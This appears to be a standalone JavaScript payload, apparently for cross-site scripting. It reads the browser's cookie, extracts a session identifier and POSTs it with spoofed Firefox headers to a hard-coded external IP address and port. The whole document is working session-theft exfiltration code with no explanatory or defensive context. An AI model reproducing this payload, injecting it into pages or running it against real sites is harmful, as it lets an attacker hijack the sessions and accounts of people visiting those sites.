var sessionid = document.cookie.split('=')[1]+".";

fetch('http://39.101.137.200:7745/send', {
  method: 'POST',
  body: 'header=fdsafdsa&listener=admin123321&content='+sessionid,
  headers: {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
  }
})
.then(response => response.text())
.then(data => console.log(data))
.catch(error => console.error(error));
